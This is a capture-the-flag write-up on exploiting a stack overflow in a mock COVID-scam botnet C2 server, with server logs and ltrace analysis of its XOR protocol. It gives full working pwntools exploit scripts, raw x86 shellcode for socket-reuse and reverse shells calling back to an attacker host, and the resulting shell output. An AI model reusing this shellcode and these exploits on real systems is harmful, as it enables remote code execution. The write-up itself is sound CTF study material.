            [*] Got keepalive for AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
            [-]Client not registered
    [+] received connection from 172.31.32.50
            [*] Got keepalive for AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
            [-]Client not registered
    [+] received connection from 172.31.32.50
            [*] Got keepalive for AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
            [-]Client not registered
    [+] received connection from 172.31.32.50
    [+] received connection from 172.31.32.50
            [*] Got keepalive for Ep5aD11k1d27b9ro3EF
            [+] Valid registration!
            [*] Tasking command #1
            [*] Tasking command #2
    [+] received connection from 172.31.32.50
            [*] Got keepalive for Ep5aD11k1d27b9ro3EF
            [+] Valid registration!
            [*] Tasking command #1
            [*] Tasking command #2
    [+] received connection from 172.31.32.50
            [*] Got keepalive for Ep5aD11k1d27b9ro3EF
            [+] Valid registration!
            [*] Tasking command #1
    ASAN:DEADLYSIGNAL
    =================================================================
    ==2068==ERROR: AddressSanitizer: SEGV on unknown address 0x41414141 (pc 0x41414141 bp 0x41414141 sp 0xf5aa3320 T1)
    ASAN:DEADLYSIGNAL
    AddressSanitizer: nested bug in the same thread, aborting.
    
    
    buffer located @ 0xf7a8e12c overwritten
    
    covid{tOol33TtOqUiTbOi}
    

**[Flag] Programming2: covid{tOol33TtOqUiTbOi}**

**[Flag] Exploit1: PUSH**

## Exploit2 for Shell

Now I’m tasked with exploiting this to get a shell on the C2 server:

![image-20200502152531949](https://0xdfimages.gitlab.io/img/image-20200502152531949.png)

### Find Offset

The first thing I needed was the exact distance from the start of my input to
the return address. I used `pattern_create` to generate a 600 byte buffer:

    
    
    root@kali# msf-pattern_create -l 600
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
    

I wrote a skeleton program to test this exploit, and included that buffer:

    
    
    #!/usr/bin/env python3
    
    import sys
    from pwn import *
    from itertools import cycle
    
    
    def encode(s):
        return ''.join([chr(x^y) for x,y in zip(s,cycle(b'0202_NOCPRED'))])
    
    def gen_cmd(s):
        return encode(s.encode()) + "\r\n\r\n"
    
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    s = remote(host,port)
    s.send(gen_cmd("ALIVE Ep5aD11k1d27b9ro3EF"))
    s.recvuntil('\r\n\r\n')
    s.send(gen_cmd('PUSH Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9'))
    
    s.interactive()
    

I’ll start the research server again, and connect to the port it provides:

    
    
    root@kali# ./covid_pwn.py  research.threatsims.com 13098
    [+] Opening connection to research.threatsims.com on port 13098: Done
    [*] Switching to interactive mode
    [*] Got EOF while reading in interactive
    $ 
    

There’s a crash on the server:

    
    
    [+] received connection from 172.31.32.50
            [*] Got keepalive for Ep5aD11k1d27b9ro3EF
            [+] Valid registration!
            [*] Tasking command #1
    ASAN:DEADLYSIGNAL
    =================================================================
    ==2077==ERROR: AddressSanitizer: SEGV on unknown address 0x41367241 (pc 0x41367241 bp 0x35724134 sp 0xf5aa3320 T1)
    ASAN:DEADLYSIGNAL
    AddressSanitizer: nested bug in the same thread, aborting.
    
    
    buffer located @ 0xf7a6712c overwritten
    

I can take that `pc` address and find the offset of 528 bytes:

    
    
    root@kali# msf-pattern_offset -q 0x41367241
    [*] Exact match at offset 528
    

### Rabbit Holes

I tried a lot of things that didn’t work here, and I mis-understood some key
information. What I missed was that this report was giving me the starting
address of the input buffer _on the actual c2_ with the line `buffer located @
0xf7a6712c overwritten`. Things I tried before pulling all that together:

  * Dropping shellcode into the address given and trying to jump to it on the research server.

  * Sometimes the crash would include a stack-trace:
    
        ==29809==ERROR: AddressSanitizer: stack-overflow on address 0xf5a7c320 (pc 0xf5a7c320 bp 0x90909090 sp 0xf5a7c320 T1)
        #0 0xf5a7c31f  (<unknown module>)
      
    SUMMARY: AddressSanitizer: stack-overflow (<unknown module>) 
    Thread T1 created by T0 here:
        #0 0x56624740  (/bin/server_asan+0x99740)
        #1 0x566726da  (/bin/server_asan+0xe76da)
        #2 0xf752d636  (/lib/i386-linux-gnu/libc.so.6+0x18636)
      
    ==29809==ABORTING
      
      
    buffer located @ 0xf7a6712c overwritten
    

We tried using that to find the libc version by searching for
`__libc_start_main_ret` in [libc database](https://github.com/niklasb/libc-
database), but without luck.

  * Tried some basic return to libc type exploitation based on guessing the libc version from other challenges in the CTF.

Once we figured out that we were exploiting the wrong server, we turned there.

### Exploit

To exploit this server, I just need to put the shellcode at the address in the
dump, and then jump to it with the address given to me by the research server.

For shellcode, I grabbed [this x86 dup2 system](http://shell-
storm.org/shellcode/files/shellcode-881.php) to reuse the connection.

The exploit will:

  * Read the host and port from the command line.
  * Generate a random 20-character string uuid.
  * Connect to the host, register the new id, receive the response task for info, send the `INFO` response, and disconnect.
  * Sleep one second.
  * Connect to the host, send the `ALIVE uuid` message, and receive the response.
  * Send the overflow as `PUSH [buffer]`, where `buffer` is 300 NOPs, shellcode, As to get to the return address, then the return address from the crash report.

    
    
    #!/usr/bin/env python3
    
    import random
    import string
    import sys
    import time
    from pwn import *
    from itertools import cycle
    
    
    def encode(s):
        return bytes([(x^y) for x,y in zip(s,cycle(b'0202_NOCPRED'))])
    
    def gen_cmd(s):
        return encode(s) + b"\r\n\r\n"
    
    
    #context.log_level = 'DEBUG'
    host = sys.argv[1]
    port = int(sys.argv[2])
    shellcode = b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
    uuid = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20)).encode()
    
    s = remote(host,port)
    s.send(gen_cmd(b"NEW " + uuid))
    s.recvuntil('\r\n\r\n')
    s.send(gen_cmd(b"INFO TheCovidBotNet"))
    s.close()
    
    time.sleep(1)
    s = remote(host,port)
    s.send(gen_cmd(b"ALIVE " + uuid))
    s.recvuntil('\r\n\r\n')
    buf = b"\x90"*300 + shellcode + b"A"*(228-len(shellcode)) + b"\x2c\xe1\xa8\xf7"
    s.send(gen_cmd(b'PUSH ' + buf))
    s.sendline('id')
    
    s.interactive()
    

This should be very reliable, but I find it isn’t at all on this server. I got
it to work about 1 out of even 10 or 20 tries. But that was enough for me to
grab the flag:

    
    
    root@kali# ./covid_pwn.py covidfunds.net 8888
    [+] Opening connection to covidfunds.net on port 8888: Done
    [*] Closed connection to covidfunds.net port 8888
    [+] Opening connection to covidfunds.net on port 8888: Done
    [*] Switching to interactive mode
    uid=1000(malware) gid=1000(malware) groups=1000(malware)
    $ ls
    bin
    boot
    config-scripts
    dev
    etc
    flag.txt
    home
    lib
    lib32
    lib64
    libx32
    media
    mnt
    opt
    proc
    root
    run
    sbin
    srv
    sys
    thanks!.txt
    tmp
    usr
    var
    $ cat flag.txt
    covid{bIgGiGaNtIcSkIlLz} 
    

**[Flag] Exploit2: covid{bIgGiGaNtIcSkIlLz}**

### Exploit Better

I had a hunch that the socket reuse shellcode was failing because it would be
trying to `dup2` the wrong fd. This can happen on a busy server. In talking
with the event creators about the issues, we figured out that socket reuse was
failing because the incoming socket is being shared across 9 C2 processes
distributed across multiple servers by a loadbalancer. I had guessed there
might be some complex networking going on when I saw the crash report
indicated the incoming connection was from `172.31.32.50`, which is a private
IP, and must be in the threatsims network.

The creators had intended us to use a reverse shell shellcode. They were nice
enough to enable the C2 again so I could test an updated script, and grab a
few details for this blog post.

I setup my home network so that port 39223 was forwarded to my Kali VM on port
443, and updated my exploit:

    
    
    #!/usr/bin/env python3
    
    import random
    import string
    import sys
    import time
    from pwn import *
    from itertools import cycle
    
    CALLBACK_DOMAIN = [REDACTED]
    CALLBACK_PORT = 39223
    
    def encode(s):
        return bytes([(x^y) for x,y in zip(s,cycle(b'0202_NOCPRED'))])
    
    def gen_cmd(s):
        return encode(s) + b"\r\n\r\n"
    
    
    addr = binascii.hexlify(socket.inet_aton(socket.gethostbyname(CALLBACK_DOMAIN)))
    port = int(CALLBACK_PORT).to_bytes(2, byteorder='big')
    uuid = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20)).encode()
    
    shellcode   = b"\x6a\x66\x58\x99\x52\x42\x52\x89\xd3\x42\x52\x89\xe1\xcd\x80\x93\x89\xd1\xb0"
    shellcode  += b"\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x87\xda\x68"
    shellcode  += binascii.unhexlify(addr) # <--- ip address
    shellcode  += b"\x66\x68"
    shellcode  += port                     # <--- tcp port
    shellcode  += b"\x66\x53\x43\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x6a\x0b\x58\x99\x89\xd1"
    shellcode  += b"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    log.info(f'Registering new uuid: {uuid}')
    s = remote(host,port)
    s.send(gen_cmd(b"NEW Ep5aD11k1d27b9ro3EF"))
    resp = encode(s.recvuntil('\r\n\r\n')[:-4])
    print(resp)
    log.info('Sending INFO')
    s.send(gen_cmd(b"INFO TheCovidBotNet"))
    s.close()
    
    log.info('Sleeping for 1 second')
    time.sleep(1)
    s = remote(host,port)
    log.info('Sending ALIVE message')
    s.send(gen_cmd(b"ALIVE Ep5aD11k1d27b9ro3EF"))
    s.recvuntil('\r\n\r\n')
    log.info('Sending exploit PUSH response')
    buf = b"\x90"*300 + shellcode + b"A"*(228-len(shellcode)) + b"\x2c\xe1\xa8\xf7"
    s.send(gen_cmd(b'PUSH ' + buf))
    s.close()
    
    l = listen(443)
    l.sendline(""" python -c 'import pty; pty.spawn("/bin/bash")'""")
    l.sendline(" export SHELL=bash")
    l.sendline(" export TERM=xterm")
    l.sendline(" stty rows 38 columns 116")
    l.sendline("id")
    l.interactive()
    

This works must more reliably:

    
    
    root@kali# ./covid_pwn2.py covidfunds.net 8888
    [+] Opening connection to covidfunds.net on port 8888: Done
    [*] Registering new uuid: b'G2wcKmuAQpg8voU4usCz'
    [*] Sending INFO
    [*] Closed connection to covidfunds.net port 8888
    [*] Sleeping for 1 second
    [+] Opening connection to covidfunds.net on port 8888: Done
    [*] Sending ALIVE message
    [*] Sending exploit PUSH response
    [+] Trying to bind to 0.0.0.0 on port 443: Done
    [+] Waiting for connections on 0.0.0.0:443: Got connection from 34.200.253.58 on port 33206
    [*] Closed connection to covidfunds.net port 8888
    [*] Switching to interactive mode
     export SHELL=bash
     export TERM=xterm
     stty rows 38 columns 116
    id
    malware@b09d8a47b5a4:/$  export SHELL=bash
    malware@b09d8a47b5a4:/$  export TERM=xterm
    malware@b09d8a47b5a4:/$  stty rows 38 columns 116
    malware@b09d8a47b5a4:/$ id
    uid=1000(malware) gid=1000(malware) groups=1000(malware)
    malware@b09d8a47b5a4:/$ $ ls
    ls
    bin   config-scripts  etc       home  lib32  libx32  mnt  proc  run   srv  thanks!.txt  usr
    boot  dev             flag.txt  lib   lib64  media   opt  root  sbin  sys  tmp          var
    

## Beyond Root - ltrace

When the CTF was running, I used `ltrace` enough to find the strings as I
showed above, and then moved to comparing those strings to the Wireshark
capture. But in writing this up, I realized there was so much more information
in the `ltrace` data that I didn’t use.

Earlier, I worked through the `ltrace` up to the connection. It had just built
the string, `NEW I7J2ugBbp0Kukd61gdB\r\n\r\n` and connected. Immediately after
that, there’s 24 calls to `memcmp` that look like this:

    
    
    memcmp(0x5826a1a0, 0x5677dcff, 4, 0x5665544e)                                                                    = 1
    memcmp(0x5826a1a1, 0x5677dcff, 4, 0x5665544e)                                                                    = 1
    memcmp(0x5826a1a2, 0x5677dcff, 4, 0x5665544e)                                                                    = 1
    ...[snip]...
    memcmp(0x5826a1b6, 0x5677dcff, 4, 0x5665544e)                                                                    = 1
    memcmp(0x5826a1b7, 0x5677dcff, 4, 0x5665544e)                                                                    = 0
    

It appears to be stepping through memory one byte at a time looking for four
bytes that match. It finds it (returns 0) on the last one. This is the 27 byte
string, looking for `\r\n\r\n`, which it finds 4 bytes from the end.

Next there are 23 calls to:

    
    
    strlen("0202_NOCPRED")                                                                                           = 12
    

When I was solving, that didn’t really jump out to me, but in hindsight, it
makes perfect sense. The code looked for the `\r\n\r\n`, and then did
something with that string for each character before that. I can guess that
the code looks something like:

    
    
    for (i = strlen(outbuffer); i < strlen(key); i++) {
        outbuf[i] = outbuf[i] ^ key[i % strlen(key)];
    }
    

So for each character, it’s having to check the `strlen` of the key, which is
why I see it 23 times.

There were then a `send` call to send the XORed string, some space created,
and a `recv` call which reads 15 bytes, and then copies those bytes to a
buffer :

    
    
    send(4, 0x5826a1a0, 27, 0)                                                                                       = 27
    calloc(1024, 1)                                                                                                  = 0x5826c3d0
    memset(0x5826a1a0, '\0', 1024)                                                                                   = 0x5826a1a0
    memset(0x5826a8f0, '\0', 32)                                                                                     = 0x5826a8f0
    malloc(1024)                                                                                                     = 0x5826c7e0
    memset(0x5826c7e0, '\0', 1024)                                                                                   = 0x5826c7e0
    recv(4, 0x57b507e0, 1024, 0)                                                                                     = 15
    memcpy(0x57b4e1a0, "wwd\022\f\027\034\n\036\024\n\r\n\r\n", 15)                                                  = 0x57b4e1a0
    

I can see in the `memcpy` the bytes that were sent back and read at `recv`.
Then a loop of 12 `memcmp` to look for `\r\n\r\n` (for some reason twice?),
followed by `strlen("0202_NOCPRED")` 12 times to decrypt the incoming data:

    
    
    memcmp(0x57b4e1a0, 0x566fccff, 4, 0x565d444e)                                                                    = 1
    ...[snip 10 times]...
    memcmp(0x57b4e1ab, 0x566fccff, 4, 0x565d444e)                                                                    = 0
    free(0x57b507e0)                                                                                                 = <void>
    memcmp(0x57b4e1a0, 0x566fccff, 4, 0x565d444e)                                                                    = 1
    ...[snip 10 times]...
    memcmp(0x57b4e1ab, 0x566fccff, 4, 0x565d444e)                                                                    = 0
    strlen("0202_NOCPRED")                                                                                           = 12
    strlen("0202_NOCPRED")                                                                                           = 12
    strlen("0202_NOCPRED")                                                                                           = 12
    strlen("0202_NOCPRED")                                                                                           = 12
    strlen("0202_NOCPRED")                                                                                           = 12
    strlen("0202_NOCPRED")                                                                                           = 12
    strlen("0202_NOCPRED")                                                                                           = 12
    strlen("0202_NOCPRED")                                                                                           = 12
    strlen("0202_NOCPRED")                                                                                           = 12
    strlen("0202_NOCPRED")                                                                                           = 12
    strlen("0202_NOCPRED")                                                                                           = 12
    

The process is very similar with the rest of the comms. There is a call to
`sleep(10)` between communication sessions. When there’s command tasking from
the server, there are calls like `popen("id", "r")`, and then the results are
send in a `PUSH` message, encrypted the same way.

[](/2020/05/04/covid-19-ctf-covidscammers.html)

